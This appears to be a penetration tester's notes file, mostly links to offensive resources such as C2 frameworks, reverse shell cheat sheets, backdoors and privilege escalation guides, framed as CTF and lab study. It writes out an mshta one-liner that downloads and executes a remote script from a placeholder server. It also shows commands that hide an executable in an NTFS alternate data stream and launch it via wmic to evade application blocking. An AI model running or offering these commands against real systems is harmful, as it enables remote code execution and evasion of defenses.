#  Microsoft wont fix list (most of these have been fixed, but will be good for ctf labs)

https://github.com/cfalta/MicrosoftWontFixList

# Windows Lateral Movement

https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f

# Pentesting AD mindmap

https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad_dark.png

# C2 Frameworks explanation (use google translate)

https://xakep.ru/2019/10/18/post-exploitation-frameworks/

- Let's start, of course, with **Rapid's Metasploit Framework 7.** At the time of writing, version 5.0.48 is available. Metasploit has the most modules today - there are tools for almost all occasions. It also works with a local database, which may include scan information, discovered accounts, and more.
- The creed of **Cobalt Strike** is stealth. The Beacon is in a state of freeze or sleep most of the time, and only a "heartbeat" (Heartbeat) is sent to C2, so it is not easy to detect.
- **Covenant** can be customized by creating your own templates. It's also great for Windows post-exploitation tasks.
- **Koadic** --> this will be a good one to learn windows UAC bypass and staging tricks
    - The Koadic console displays completed and active implant jobs. In general, the interface resembles everyone's favorite Metasploit.
- **Merlin**, another one to mess with: https://github.com/Ne0nd0g/merlin

- **silver** https://github.com/BishopFox/sliver

# Explanation of setuid setgid and sticky bits under Linux:

https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits

# DNSCAT2

This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.

https://github.com/iagox86/dnscat2

# DeathStar

--> Automated AD Common exploits for domain admin

https://github.com/byt3bl33d3r/DeathStar

# Reverse Shells For Windows

https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/

# One liners to brute force web services

https://book.hacktricks.xyz/brute-force

# Some Backdoors

https://github.com/hackerhouse-opensource/backdoors

# Checklist Local Windows Priv Esc:
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

# Priv Esc Tips:
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#system-info

# PenTesting Tools Cheatsheet:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/

# Windows Enable RDP via registry


![image](https://user-images.githubusercontent.com/97367610/149876284-ee972425-ea00-45c9-80af-4ebef8c70f37.png)


# Run VB Script with Mshta (works)

--> Commands are separated by ":"
--> Strings have a double ""

```

mshta vbscript:Execute("MsgBox(""Hello""):MsgBox(""Strings"")(window.close)")

#Download and execute a ".sct" script
 mshta vbscript:Close(Execute("GetObject(""script:http://yourserver/thing.sct"")"))



```



# Alternate Data Streams (Hide sh*t)


https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/

The Dude just ran **sysinternals access check** to find open permissions on a windows box and then
used ADS to inject an executable/Script into them, this usally bypasses Application blocking...

**If you format a flash drive as NTFS, you can move files with ADS across windows systems**

```

echo "Hello World" > a.txt
type C:\Tank.exe > C:\Temp\a.txt:Tank.exe
wmic process call create 'C:\Temp\a.txt:Tank.exe'

```


# Regsvr32 exploit 

(This doesn't seem to work on current versions of Windows, could have done it wrong however)

https://www.varonis.com/blog/living-of-the-land-lol-with-microsoft-tools-part-i-intro-to-regsvr/


# Shodan Guide

https://community.turgensec.com/shodan-pentesting-guide/


# using ctor for lol tech:
http://www.hexacorn.com/blog/2020/01/24/how-to-be-a-bad-ctor/


# Reverse Shell CheatSheet
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://highon.coffee/blog/reverse-shell-cheat-sheet/


# Disable Auto logoff for ssh session (normally and through hacking means)
https://www.ostechnix.com/auto-logout-inactive-users-period-time-linux/

https://stackoverflow.com/questions/17397069/unset-readonly-variable-in-bash

# SYLK Macros (Excel)
https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/


# XLM Macros (Excel)
https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/


# Some Ports to block from outside internet:

![image](https://user-images.githubusercontent.com/97367610/149877245-034e110d-40b0-4429-9e2b-8cd074bd0c34.png)


# Best Places to Put UNC Paths:
```
https://blog.netspi.com/10-places-to-stick-your-unc-path/
```
